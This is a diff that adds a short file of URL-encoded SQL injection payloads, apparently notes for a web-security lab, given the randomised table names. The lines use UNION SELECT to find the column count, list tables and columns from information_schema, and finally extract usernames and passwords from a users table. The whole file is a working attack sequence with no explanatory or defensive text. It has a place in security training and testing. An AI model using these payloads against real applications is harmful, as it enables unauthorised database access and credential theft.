@@ -1,0 +1,5 @@
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+'a','a'--
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+where+table_name='users_twcosh'--
+'+UNION+SELECT+username_bnhawo,password_zyxpsi+FROM+users_twcosh--
